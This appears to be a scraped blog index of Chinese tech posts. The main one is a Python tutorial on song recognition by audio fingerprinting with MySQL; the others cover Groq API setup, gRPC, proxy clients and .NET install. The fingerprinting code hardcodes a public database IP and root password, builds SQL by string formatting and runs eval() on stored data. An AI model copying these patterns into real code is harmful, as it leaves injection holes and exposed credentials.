嗓音纯度特征不同人的噪音，纯度一般是不一样的，大致可分为高纯度(明亮)、低纯度(沙哑)和中等纯度三个等级 平均音高特征平均音高的高低:嗓音高亢还是低沉 音域特征音域的高低:声音饱满还是干瘪 声纹识别流程声纹识别作为生物识别的一种，也可称为说话人识别，从说话人发出的语音信号中提取声纹特征信息。通常具有两个阶段，即声音注册和声音验证。 声纹注册-&gt;有效语音提取-&gt;提取特征-&gt;声纹数据库&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;↑ &emsp;&emsp;&emsp;│&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;提取算法&emsp;对比算法&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; &emsp;↓ &emsp;&emsp;&emsp;↓声纹验证-&gt;有效语音提取-&gt;提取特征-&gt;特征对比-&gt;识别结果 3.背景歌名识别所涉及相关技术特征提取声纹识别中重要的一步为特征提取，即识别音频信号，获取所需语音信息 实现1.语音信号分帧音频信号不断变化，为了简化处理步骤，将音频信号分帧处理(常分为20~40ms帧)确保每帧的音频信号变化稳定 2.对每帧做傅里叶变换傅里叶变换适用于分心平稳的音频信号，傅里叶变换对针对每一帧音频信号进行处理，只记录不接近于零的频域信息，从而减少数据量 时域描述数学函数或物理信号对时间的关系，通常呈现为波形频域在对函数或信号进行分析时，分析其和频率有关的部分，而不是和时间的有关部分，与时域相对，通常呈现为频谱 傅里叶变换傅里叶变换:作为一种线性积分变换，可用于音频信号在时域和频域之间的转换。其实质为:将时域信号变换为频域信号，将繁杂的数据简化，仅需要对少部分数据进行处理。(也就是说，我们在对信号做傅里叶变换时，只需要记录其中不接近零的频域信息即可，这样做就使得数据量大大减少)针对音频数据进行傅里叶变换后，对数据进行求模，得到多组数组，对数组进行整合(例:将四个数组中模长最长的下标进行合并，合成一个四元组)，从而获得核心的音频“指纹”。 匹配声纹数据库在对声音进行注册后，通过提取语音特征，获得声纹导入数据库中建立对应的声纹数据库当获取到语音文件之后，通过预处理获取到语音特征，经过与声纹数据进行特征对比，从而得到最佳的识别结果。 声纹识别应用安防作为生物特征识别技术，可以用于刑侦、鉴定识别等领域金融通过声纹技术提供用户注册、用户验证等功能社保通过声纹技术对用户进行身份认证，确保参保人员生存状况智能硬件通过声纹识别技术，实现“听声识人”，让智能硬件能够区分不同的角色 4. 背景歌名识别实践歌名识别 架构python + 云数据库RDS py3Pymysql (py2 mysqldb)Moviepy 转音频PyAudio 语音操作 关系型数据库系型数据库(Relational Database Service，简称RDS)是一种基于云计算平台的即开即用、稳定可靠、弹性伸缩、便捷管理的在线关系型数据库服务。 云关系型数据库可支持以下几类数据库引擎:MySQL，PostgreSQL，SQL Server，GaussDB(openGauss)特点优势 开箱即用，按需付费，可视管理，弹性伸缩 建立声纹数据库存储海量声纹数据，建立声纹数据库通过与Python连接，在Python通过组件及代码获取到可用于存储的声纹特征之后，存入数据库RDS对应新建库singdb中 作为声纹数据库，进行声纹特征匹配，从而实现歌名识别在Python获取到用户所需对比识别的短视频后，通过提取对应声纹特征，与声纹数据库中的声纹特征进行对比，从而获取到对应的歌曲名称，实现背景歌名识别 流程配置数据库-&gt;安装py-anaconda下载组件-&gt;关联数据库和py-&gt;验证结果 新建数据库singdbutf8mb4 song_name varchar200fq longtext 12pip install pymysqlpip install -user moviepy -i http://pypi.douban.com/simple --trusted-host=pypi.douban.com 视频转音频1234from moviepy.editor importvideo=VideoFileClip(&#x27;示例1.mp4&#x27;)audio = video.audioaudio.write audiofile(&#x27;示例1.wav&#x27;) 验证结果1234567sss=memory(&quot;弹性公网IP&#x27;,3306,&#x27;root&quot;,&#x27;自行设置的密码’,&#x27;singdb&#x27;)res=sss.search and play(&#x27;示例1.wav&#x27;)score=max(res)if score[0]&lt;1000:print(“没有找到&quot;”)else:print(&quot;歌曲名称:&quot;,score[1]) 通过Python的相关代码对短视频进行视音分离并建立声音指纹数据库，通过短视频背景音乐与声学模型进行匹配，从而获取到背景歌名。 总结语音处理的基础知识及应用语音处理的基本步骤熟悉声纹识别的部署方式及整体流程 习题Python需通过弹性公网IP与云数据库RDS进行连接。ture声纹识别稳定性 可测量性 唯一性特征提取对音频信号做分帧处理20~40ms帧 test数据库名称：singdb（可自定义）字符集：utf8mb4表名：fingerprint（可自定义）存储引擎：InnoDB字符集：utf8mb4校验规则：utf8mb4_general_ci Pycharm提取需存储在数据库中供检索识别的音频文件的特征信息（音频处理的类有三种方法：载入数据、傅里叶变换、播放音乐 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# coding=utf8import osimport reimport waveimport numpy as npimport pyaudioclass voice(): def loaddata(self, filepath): if type(filepath) != str: raise TypeError p1 = re.compile(&#x27;\\.wav&#x27;) if p1.findall(filepath) is None: raise IOError try: f = wave.open(filepath, &#x27;rb&#x27;) params = f.getparams() self.nchannels, self.sampwidth, self.framerate, self.nframes = params[:4] str_data = f.readframes(self.nframes) #self.wave_data = np.fromstring(str_data, dtype=np.short) self.wave_data = np.frombuffer(str_data, dtype=np.short) self.wave_data.shape = -1, self.sampwidth self.wave_data = self.wave_data.T f.close() self.name = os.path.basename(filepath) return True except: raise IOError def fft(self, frames=40): block = [] fft_blocks = [] self.high_point = [] blocks_size = self.framerate // frames blocks_num = self.nframes / blocks_size for i in range(0, len(self.wave_data[0]) - blocks_size, blocks_size): block.append(self.wave_data[0][i:i + blocks_size]) fft_blocks.append(np.abs(np.fft.fft(self.wave_data[0][i:i + blocks_size]))) self.high_point.append((np.argmax(fft_blocks[-1][:40]), np.argmax(fft_blocks[-1][40:80]) + 40, np.argmax(fft_blocks[-1][80:120]) + 80, np.argmax(fft_blocks[-1][120:180]) + 120, # np.argmax(fft_blocks[-1][180:300]) + 180, )) def play(self, filepath): chunk = 1024 wf = wave.open(filepath, &#x27;rb&#x27;) p = pyaudio.PyAudio() stream = p.open(format=p.get_format_from_width(wf.getsampwidth()), channels=wf.getnchannels(), rate=wf.getframerate(), output=True) while True: data = wf.readframes(chunk) if data == &quot;&quot;: break stream.write(data) stream.close() p.terminate()if __name__ == &#x27;__main__&#x27;: p = voice() p.loaddata(&quot;./music01.wav&quot;) # p.play(&#x27;temp/1.wav&#x27;)print(p.name) 将提取到的音频文件特质特征关联到新建数据库里的数据表中（即声音指纹数据） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110# coding=utf-8import pymysql as MySQLdbclass memory(): def __init__(self, host, port, user, passwd, db): self.host = host self.port = port self.user = user self.passwd = passwd self.db = db def addsong(self, path): if type(path) != str: raise TypeError # , &#x27;path need string&#x27; basename = os.path.basename(path) try: conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db, charset=&#x27;utf8&#x27;) except: print(&#x27;DataBase error&#x27;) return None cur = conn.cursor() namecount = cur.execute(&quot;select * from fingerprint WHERE song_name = &#x27;%s&#x27;&quot; % basename) if namecount &gt; 0: print(&#x27;the song has been record!&#x27;) return None v = voice() v.loaddata(path) v.fft() cur.execute(&quot;insert into fingerprint VALUES(&#x27;%s&#x27;,&#x27;%s&#x27;)&quot; % (basename, v.high_point.__str__())) conn.commit() print(&#x27;Added to database:%s&#x27; % (basename)) cur.close() conn.close() def fp_compare(self, search_fp, match_fp): if len(search_fp) &gt; len(match_fp): return 0 max_similar = 0 search_fp_len = len(search_fp) match_fp_len = len(match_fp) for i in range(match_fp_len - search_fp_len): temp = 0 for j in range(search_fp_len): if match_fp[i + j] == search_fp[j]: temp += 1 if temp &gt; max_similar: max_similar = temp return max_similar def search(self, path): v = voice() v.loaddata(path) v.fft() try: conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db, charset=&#x27;utf8&#x27;) except: raise IOError cur = conn.cursor() cur.execute(&quot;SELECT * FROM fingerprint&quot;) result = cur.fetchall() compare_res = [] for i in result: compare_res.append((self.fp_compare(v.high_point[:-1], eval(i[1])), i[0])) compare_res.sort(reverse=True) cur.close() conn.close() print(compare_res) return compare_res def search_and_play(self, path): v = voice() v.loaddata(path) v.fft() try: conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db, charset=&#x27;utf8&#x27;) except: print(&#x27;DataBase error&#x27;) return None cur = conn.cursor() cur.execute(&quot;SELECT * FROM fingerprint&quot;) result = cur.fetchall() compare_res = [] for i in result: compare_res.append((self.fp_compare(v.high_point[:-1], eval(i[1])), i[0])) compare_res.sort(reverse=True) cur.close() conn.close() print(compare_res) # v.play(compare_res[0][1]) return compare_res # sss.addsong(&#x27;taiyangzhaochangshengqi.wav&#x27;) # sss.addsong(&#x27;beiyiwangdeshiguang.wav&#x27;) # sss.addsong(&#x27;xiaozezhenger.wav&#x27;) # sss.addsong(&#x27;nverqing.wav&#x27;) # sss.addsong(&#x27;the_mess.wav&#x27;) # sss.addsong(&#x27;windmill.wav&#x27;) # sss.addsong(&#x27;end_of_world.wav&#x27;)sss = memory(&#x27;1.94.241.19&#x27;, 3306, &#x27;root&#x27;, &#x27;Huawei@2023&#x27;, &#x27;singdb&#x27;)sss.addsong(&#x27;./music01.wav&#x27;)sss.addsong(&#x27;./music02.wav&#x27;)sss.addsong(&#x27;./music03.wav&#x27;)sss.addsong(&#x27;./music04.wav&#x27;) 此时将获取到的声音指纹存储在数据库singdb的表fingerprint中（注意：代码中的弹性公网IP、端口号、root密码要根据实际配置的内容进行更改）。 数据库查询select 12345song_name fqmusic01.wav[(0, 73, 80, 132), (5, 76, 112, 135), (4, 52, 112, 135), (7, 76, 112, 135), (4, 74, 119, 135), (7, 76, 119, 135)... ] music02.wav[(0, 40, 80, 120), (6, 40, 98, 130), (3, 68, 88, 122), (5, 73, 93, 144), (3, 51, 92, 143), (3, 62, 92, 159)...] 对抖音短视频进行处理，提取其中的音频信息（这里音频格式可以为mp3、wav等，这里建议选择wav格式）。 12345from moviepy.editor import *video = VideoFileClip(&#x27;example01.mp4&#x27;)audio = video.audioaudio.write_audiofile(&#x27;example01.wav&#x27;) 执行代码，结果显示，此时查看文件夹中已经生成对应的“example01.wav”音频文件。 验证结果 1234567sss = memory(&#x27;EIP&#x27;, 3306, &#x27;root&#x27;, &#x27;Huawei@2023&#x27;, &#x27;singdb&#x27;)res = sss.search_and_play(&#x27;example01.wav&#x27;)score = max(res)if score[0]&lt;1000: print(&quot;Not Found&quot;)else: print(&quot;Song Name&quot;,score[1]) 执行代码，结果显示已经识别出“example01”音频的歌曲名。结果 12[(1578, &#x27;music02.wav&#x27;), (0, &#x27;music04.wav&#x27;), (0, &#x27;music03.wav&#x27;), (0, &#x27;music01.wav&#x27;)]Song Name music02.wav test.py,点击Run ‘test’,或者快捷键ctrl+Shift+f10运行python文件。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"},{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"}],"author":"mu"},{"title":"llama-3.3-70b-versatile","slug":"llama-3-3-70b-versatile","date":"2024-12-10T14:32:02.000Z","updated":"2024-12-10T14:33:06.834Z","comments":true,"path":"2024/12/10/llama-3-3-70b-versatile/","permalink":"https://banjinmei.github.io/2024/12/10/llama-3-3-70b-versatile/","excerpt":"","text":"llama-3.3-70b-versatileGroq API 免费使用教程第一步：获取 API 访问 https://console.groq.com/ 完成注册并申请 API -&gt; googlemail 保存获得的 API 密钥 第二步：配置 NextChat 打开 https://app.nextchat.dev/https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web 在左侧设置中填入：设置-&gt;模型服务商-&gt;Google设置-&gt;自定义接口模型(model) llama-3.3-70b-versatile 接口地址：https://api.groq.com/openai/ API Key：填入之前获取的密钥 自定义模型：llama-3.3-70b-versatile 主要优势 响应速度：200 Token&#x2F;秒 性能表现：接近 GPT-4.0 水平 完全免费使用 使用限制 每分钟限额：6000 Token 每日 API 调用：14000 次 足够普通用户日常使用 gsk_U2MI0vooKS4JyCtmNMLHWGdyxxxfqo 1提问：你是什么大模型 12345678910111213回答：我是人工智能模型，特别是一种大型语言模型。我的主要功能是理解和生成类似人类的文本。我的训练数据包括了大量的文本信息，这使我能够学习语言的模式和结构，并根据这个学习生成类似人类的回答。我的能力包括但不限于：回答问题：我可以根据我的训练数据回答广泛的题目，从科学和历史到娱乐和文化。生成文本：我可以根据给定的提示或主题生成文本，包括文章、故事、诗歌等。翻译：我可以进行语言之间的翻译，例如从英语翻译到西班牙语、法语、德语等。摘要：我可以将长篇文本摘要为简短的摘要，帮助用户快速理解主要内容。对话：我可以与用户进行对话，回答问题，提供信息，甚至参与辩论。我的优势在于能够快速处理和生成大量信息，但是我的能力也受到训练数据的限制。因此，我可能无法总是提供完全准确或最新的信息。然而，我会尽力提供最好的答案和帮助。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"llama","slug":"llama","permalink":"https://banjinmei.github.io/tags/llama/"},{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"}],"author":"mu"},{"title":"gRPC","slug":"gRPC","date":"2024-12-09T15:18:09.000Z","updated":"2024-12-09T15:37:12.296Z","comments":true,"path":"2024/12/09/gRPC/","permalink":"https://banjinmei.github.io/2024/12/09/gRPC/","excerpt":"","text":"gRPC（Google Remote Procedure Call）是一个高性能、开源和通用的RPC框架，最初由Google开发。它使用HTTP&#x2F;2作为传输协议，并默认采用Protocol Buffers作为接口定义语言（IDL）和消息格式。gRPC支持多种编程语言，包括但不限于C++、Java、Python、Go、Ruby、C#、Node.js、PHP等。 gRPC 特点：高效的数据交换：通过使用Protocol Buffers（Protobuf），gRPC能够以二进制形式序列化和反序列化数据，这比JSON或XML等文本格式更紧凑、更快。双向流式通信：gRPC支持四种不同的调用类型：简单RPC、服务器端流式RPC、客户端流式RPC以及双向流式RPC。这使得开发者可以灵活选择最适合其应用场景的通信模式。HTTP&#x2F;2：gRPC基于HTTP&#x2F;2构建，这意味着它可以利用HTTP&#x2F;2提供的特性，如多路复用、头部压缩、流量控制等，来提高性能和可靠性。跨平台支持：gRPC可以在多种环境中运行，包括云服务、本地部署、移动端等，并且对各种编程语言都有良好的支持，便于构建跨平台的应用程序。插件系统：gRPC提供了一个插件系统，允许用户自定义代码生成逻辑，或者添加额外的功能，如认证、日志记录、监控等。强大的社区和生态系统：由于它是Google的产品并且被广泛采用，因此拥有一个活跃的社区和丰富的第三方库与工具生态系统。 gRPC 场景：gRPC的使用场景非常广泛，尤其适用于需要高效、可靠和高性能通信的应用程序。以下是gRPC的一些典型使用场景： 1. 微服务架构服务间通信：在微服务架构中，不同的服务可能使用不同的编程语言实现，并且需要高效地相互交流。gRPC以其跨语言支持和高效的二进制协议（Protocol Buffers），成为构建微服务之间通信层的理想选择。负载均衡：gRPC原生支持客户端负载均衡，可以帮助分散请求到多个服务实例上，提高系统的可用性和性能。 2. 实时应用程序双向流式通信：gRPC的双向流特性非常适合用于实时应用程序，如聊天应用、在线游戏、视频会议等，其中客户端和服务端需要持续地交换数据。实时数据推送：对于需要从服务器向客户端推送实时更新的应用，例如股票行情、社交媒体通知、物联网设备状态更新等，gRPC的服务端流式RPC可以有效地实现这一需求。 3. 移动应用与后端通信轻量级性能：由于其高效的序列化机制和较低的网络开销，gRPC特别适合移动应用与后端服务器之间的通信，特别是在网络条件不佳的情况下，能够减少电量消耗并提高响应速度。快速开发：gRPC自动生成客户端和服务端代码的能力，大大简化了开发流程，尤其是在多平台开发环境中，减少了重复劳动。 4. 跨语言通信多语言环境：gRPC支持多种编程语言，使得它非常适合用于跨语言通信的场景。不同团队或项目可以使用各自熟悉的技术栈，同时通过gRPC进行无缝集成。异构系统集成：当需要将遗留系统与现代应用集成时，gRPC的跨语言能力可以帮助桥接这些系统，促进信息的流动和交互。 5. 分布式系统节点间通信：在分布式系统中，各节点之间的通信是至关重要的。gRPC提供的高效率和可靠性使其成为分布式计算、任务分发、集群管理等场景下的首选通信框架。数据同步：gRPC可以用来实现实时的数据同步，确保分布式系统中的所有节点都拥有最新的数据副本。 6. 容器化环境服务发现：在Kubernetes等容器编排平台上，gRPC可以通过服务发现机制自动找到其他服务，简化了容器间的通信配置。轻量级部署：gRPC的轻量级特性和对多语言的支持，使其非常适合容器化部署，有助于提升资源利用率和服务扩展性。 7. API后端服务高性能API：许多大型互联网公司使用gRPC来构建其API后端服务，因为它提供了高性能、可扩展性和易于维护的方式来处理客户端请求。类型安全：gRPC的IDL（接口定义语言）定义了严格的服务契约，保证了服务端和客户端之间的调用是类型安全的，减少了运行时错误的发生。 8. 物联网（IoT）低资源消耗：gRPC的高效性能和紧凑的消息格式，使得它成为连接IoT设备和传感器的理想通信协议，能够在有限的计算和网络资源下提供可靠的通信。实时监控与控制：gRPC的流式API非常适合用于实时监控和控制IoT设备，如智能家居系统、工业自动化等场景。 9. 大数据和机器学习数据传输：在大数据处理和机器学习训练过程中，gRPC可以用来高效地传输大量数据，特别是当数据需要在不同的计算节点之间传递时。模型服务：gRPC常被用于构建机器学习模型的服务化接口，允许客户端以高效的方式查询模型预测结果。综上所述，gRPC是一个灵活且强大的通信框架，适用于各种需要高效、可靠通信的场景。无论是构建复杂的微服务架构，还是简单的客户端-服务器应用，gRPC都能提供显著的优势。 Node.js gRPC 创建和调用 gRPC 服务。包括服务器和客户端实现。 1. 安装必要的包在项目目录下执行以下命令安装 gRPC 相关依赖： 1npm install @grpc/grpc-js @grpc/proto-loader 2. 创建 proto 文件创建一个文件 example.proto 定义 gRPC 服务和消息结构： proto 12345678910111213syntax = &quot;proto3&quot;;service ExampleService &#123; rpc SayHello (HelloRequest) returns (HelloReply);&#125;message HelloRequest &#123; string name = 1;&#125;message HelloReply &#123; string message = 1;&#125; 3. 实现 gRPC 服务器创建一个文件 server.js，实现 gRPC 服务： 12345678910111213141516171819202122232425262728293031323334const grpc = require(&#x27;@grpc/grpc-js&#x27;);const protoLoader = require(&#x27;@grpc/proto-loader&#x27;);const path = require(&#x27;path&#x27;);// 加载 proto 文件const PROTO_PATH = path.join(__dirname, &#x27;example.proto&#x27;);const packageDefinition = protoLoader.loadSync(PROTO_PATH, &#123; keepCase: true, longs: String, enums: String, defaults: true, oneofs: true,&#125;);const exampleProto = grpc.loadPackageDefinition(packageDefinition);// 实现 SayHello 方法function sayHello(call, callback) &#123; const name = call.request.name; callback(null, &#123; message: `Hello, $&#123;name&#125;!` &#125;);&#125;// 创建和启动 gRPC 服务器function main() &#123; const server = new grpc.Server(); server.addService(exampleProto.ExampleService.service, &#123; SayHello: sayHello &#125;); const port = &#x27;127.0.0.1:50051&#x27;; server.bindAsync(port, grpc.ServerCredentials.createInsecure(), () =&gt; &#123; console.log(`Server running at $&#123;port&#125;`); // 不再需要调用 server.start() &#125;);&#125;main(); 4. 实现 gRPC 客户端创建一个文件 client.js，调用 gRPC 服务： 12345678910111213141516171819202122232425262728293031const grpc = require(&#x27;@grpc/grpc-js&#x27;);const protoLoader = require(&#x27;@grpc/proto-loader&#x27;);const path = require(&#x27;path&#x27;);// 加载 proto 文件const PROTO_PATH = path.join(__dirname, &#x27;example.proto&#x27;);const packageDefinition = protoLoader.loadSync(PROTO_PATH, &#123; keepCase: true, longs: String, enums: String, defaults: true, oneofs: true,&#125;);const exampleProto = grpc.loadPackageDefinition(packageDefinition);// 创建客户端并调用服务function main() &#123; const client = new exampleProto.ExampleService(&#x27;127.0.0.1:50051&#x27;, grpc.credentials.createInsecure()); const name = &#x27;World&#x27;; client.SayHello(&#123; name &#125;, (error, response) =&gt; &#123; if (error) &#123; console.error(&#x27;Error:&#x27;, error); &#125; else &#123; console.log(&#x27;Server Response:&#x27;, response.message); &#125; &#125;);&#125;main(); 5. 运行示例启动服务器： 1node server.js 在另一个终端窗口运行客户端： 1node client.js 在客户端终端看到以下输出： 1Server Response: Hello, World! proto 文件：用于定义服务和消息结构。服务器：通过 grpc.Server 创建并实现服务方法。客户端：通过 grpc.Client 调用服务并处理响应。可以基于此示例扩展自己的 gRPC 服务功能。 C#编写的 gRPC 客户端1. 添加依赖在的 C# 项目中，添加以下 NuGet 包： 1234dotnet add package Grpc.Net.Clientdotnet add package Grpc.Toolsdotnet add package google.protobuf 2. 配置 example.proto将 example.proto 文件添加到的 C# 项目中，并编辑 .csproj 文件以生成客户端代码。添加以下内容到 节点中： 1234&lt;ItemGroup&gt; &lt;Protobuf Include=&quot;example.proto&quot; GrpcServices=&quot;Client&quot; /&gt;&lt;/ItemGroup&gt; 这将告诉编译器根据 example.proto 文件生成 C# 客户端代码。 3. 编写客户端代码创建一个文件 Program.cs，内容如下： 123456789101112131415161718192021222324using Grpc.Net.Client;using Example;// 确保命名空间与 example.proto 中的 package 定义一致class Program&#123; static async Task Main(string[] args) &#123; // 创建 gRPC 通道 using var channel = GrpcChannel.ForAddress(&quot;http://127.0.0.1:50051&quot;); // 创建客户端 var client = new ExampleService.ExampleServiceClient(channel); // 调用服务方法 var request = new HelloRequest &#123; Name = &quot;World&quot; &#125;; var reply = await client.SayHelloAsync(request); // 输出服务响应 Console.WriteLine(&quot;Server Response: &quot; + reply.Message); &#125;&#125; 运行客户端确保 Node.js gRPC 服务器正在运行。 在的 C# 项目目录中运行： 1dotnet run 如果一切正常，看到以下输出： Server Response: Hello, World! Proto 文件的路径配置： 确保 example.proto 中的 package 定义为 Example，并与 C# 命名空间一致。 生成的客户端代码： 根据 example.proto，工具会生成 ExampleServiceClient 和 HelloRequest&#x2F;HelloReply 类。只需调用这些类与服务通信。 gRPC 通道： 使用 GrpcChannel.ForAddress 创建一个到服务器的连接。 异步调用： gRPC 方法通常是异步的，使用 await 来调用它们。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"gRPC","slug":"gRPC","permalink":"https://banjinmei.github.io/tags/gRPC/"}],"author":"mu"},{"title":"Clash V2Ray ClashVerge 科学上网 富强","slug":"Clash-V2RayClashVerge-科学上网-富强","date":"2024-12-06T15:13:02.000Z","updated":"2024-12-06T15:57:02.293Z","comments":true,"path":"2024/12/06/Clash-V2RayClashVerge-科学上网-富强/","permalink":"https://banjinmei.github.io/2024/12/06/Clash-V2RayClashVerge-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-%E5%AF%8C%E5%BC%BA/","excerpt":"","text":"Clash androidgithub.com&#x2F;metacubex&#x2F;clashmetaforandroid&#x2F;releases 1.配置 - 右上角 + url导入2.输入url save3.点击已停止 -&gt; 切换成 运行中4.点击代理 选择节点 V2Ray wingithub.com&#x2F;2dust&#x2F;v2rayN&#x2F;releases 1.订阅分组 -&gt; 订阅分组设置 save2.订阅分组 -&gt; 更新全部订阅3.服务器 -&gt; 设为活动服务器 or 右键托盘 自动 ClashVerge macgithub.com&#x2F;clash-verge-rev&#x2F;clash-verge&#x2F;releases 1.菜单&gt;订阅 - 新建2.名称 间隔 300min 输入订阅链接 save3.选中 刷新4.菜单&gt;代理 - 全局 -节点 选择绿色的5.菜单&gt;设置 - 系统代理 开关 ios shadowrocket sing-box","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"ASP.NET Core 9.0","slug":"ASP-NET-Core-9-0","date":"2024-12-05T13:56:25.000Z","updated":"2025-01-01T15:59:46.266Z","comments":true,"path":"2024/12/05/ASP-NET-Core-9-0/","permalink":"https://banjinmei.github.io/2024/12/05/ASP-NET-Core-9-0/","excerpt":"","text":".net9引入了扩展类型特性，允许开发者扩展实例成员、静态成员以及属性成员，打破了以往只能通过静态类定义扩展方法的限制；params 关键字不再局限于数组类型，可与多种集合类型一起使用；新增 System.Threading.Lock 类型用于线程同步，改进了线程同步机制；异常处理速度大幅提升，环路性能也有所提高，动态 PGO 降低了类型检查成本，RyuJIT 编译器内联更通用的方法以减少方法调用开销等.linq新增了 CountBy 和 AggregateBy 方法，可通过键进行状态聚合，无需通过 GroupBy 进行中间分组，提高了数据查询的效率和灵活性.引入了 CryptographicOperations 类型中的新的一次性哈希方法，支持最新的加密标准，并新增了一些加密相关的 API；强化了安全机制，如引入更强大的身份验证和授权机制，支持 OAuth 2.0 和 OpenID Connect 等，还通过 AI 驱动的安全功能实现实时威胁检测 Debian 12 安装.NET 9添加 Microsoft 包签名密钥和包存储库：打开终端，运行以下命令： 123wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.debrm packages-microsoft-prod.deb 安装.NET SDK：如果需要开发.NET 应用程序，可安装.NET SDK，运行以下命令： 12sudo apt-get update &amp;&amp; \\sudo apt-get install -y dotnet-sdk-9.0 安装.NET 运行时：如果只需要运行.NET 应用程序，可安装.NET 运行时。建议安装ASP.NET Core 运行时，因为它包含了.NET 和ASP.NET Core 运行时，在终端中运行以下命令： 12sudo apt-get update &amp;&amp; \\sudo apt-get install -y aspnetcore-runtime-9.0 作为ASP.NET Core 运行时的替代方法也可以安装不包含ASP.NET Core 支持的.NET 运行时，将上述命令中的aspnetcore-runtime-9.0替换为dotnet-runtime-9.0，即： 1sudo apt-get install -y dotnet-runtime-9.0 验证是否安装成功1dotnet --version old .NET8123sudo apt update sudo apt upgrade -ywget -O 下载并以不同的文件名保存 添加 Microsoft 包仓库123wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.debsudo apt update 2 .net81sudo apt install -y dotnet-sdk-8.0 123456789wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.deb# 8 sudo apt-get update; \\ sudo apt-get install -y apt-transport-https &amp;&amp; \\ sudo apt-get update &amp;&amp; \\ sudo apt-get install -y dotnet-sdk-8.0","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net9.0","slug":"net9-0","permalink":"https://banjinmei.github.io/tags/net9-0/"}],"author":"mu"},{"title":"Navigation","slug":"Navigation","date":"2024-12-04T11:31:51.000Z","updated":"2024-12-25T17:29:08.714Z","comments":true,"path":"2024/12/04/Navigation/","permalink":"https://banjinmei.github.io/2024/12/04/Navigation/","excerpt":"","text":"Study Tools AI Hexo Fun Game const data = [ { \"category\": \"Study\", \"items\": [ { \"title\": \"web3\", \"url\": \"https://www.hackquest.io/ \", \"img\": \"https://t8.baidu.com/it/u=2123981564,3721828760&fm=217&app=126&size=f242,150&n=0&f=PNG\", \"description\": \"web3 Learn and Grow Careers in Web3.\" }, { \"title\": \"人人都是产品经理\", \"url\": \"https://www.woshipm.com/\", \"img\": \"https://image.woshipm.com/fp/images/logo.png\", \"description\": \"产品经理、产品爱好者学习交流平台\" }, { \"title\": \"Element Plus\", \"url\": \"https://element-plus.org/\", \"img\": \"https://element-plus.org/images/element-plus-logo.svg\", \"description\": \"面向设计师和开发者的组件库 基于Vue 3\" }, { \"title\": \"AMZ123\", \"url\": \"https://www.amz123.com/\", \"img\": \"https://t7.baidu.com/it/u=1062105737,570237901&fm=190&app=131&size=f242,150&n=0&f=JPE\", \"description\": \"AMZ123亚马逊导航是一家致力于服务中国跨境电商从业者的综合平台\" }, { \"title\": \"nodejs\", \"url\": \"https://nodejs.org/\", \"img\": \"https://nodejs.org/static/logos/nodejsDark.svg\", \"description\": \"Node.js® 是一个免费、开源、跨平台的JavaScript运行时环境,\" }, { \"title\": \"php中文网\", \"url\": \"https://www.php.cn/\", \"img\": \"https://www.php.cn/static/images/logo.png\", \"description\": \"php.cn php中文网-教程_手册_视频-免费php在线学习平台\" }, { \"title\": \"菜鸟教程\", \"url\": \"https://www.runoob.com/\", \"img\": \"https://www.runoob.com/wp-content/themes/runoob/assets/img/runoob-logo.png\", \"description\": \"菜鸟教程 学的不仅是技术，更是梦想！\" }, { \"title\": \"全球主机交流论\", \"url\": \"https://hostloc.com/\", \"img\": \"https://hostloc.com/static/image/common/logo.png\", \"description\": \"vps\" }, { \"title\": \"V2EX\", \"url\": \"https://www.v2ex.com/\", \"img\": \"/images/face.png\", \"description\": \"V2EX 创意工作者的社区。讨论编程、设计、硬件、游戏等令人激动的话题。\" }, { \"title\": \"LINUX DO\", \"url\": \"https://linux.do/\", \"img\": \"https://linux.do/uploads/default/original/3X/b/4/b4fa45d8b03df61f5d011e173c0adf8497028b16.png\", \"description\": \"LINUX DO - 新的理想型社区\" }, { \"title\": \"电鸭\", \"url\": \"https://eleduck.com/\", \"img\": \"https://static.eleduck.com/_next/static/media/logo.dec76c92.png\", \"description\": \"电鸭社区,专注远程办公及招聘,远程办公从电鸭开始,远程工作,自由职业,兼职外包,在家工作,remote working,remotely,freelancer,\" }, { \"title\": \"GitHub\", \"url\": \"https://github.com/\", \"img\": \"https://github.githubassets.com/images/icons/emoji/octocat.png\", \"description\": \"Build software better, together GitHub is where people build software. \" }, { \"title\": \"golang\", \"url\": \"https://golang.google.cn/\", \"img\": \"/images/face.png\", \"description\": \"https://golang.google.cn/\" }, { \"title\": \"CSDN\", \"url\": \"https://www.csdn.net/\", \"img\": 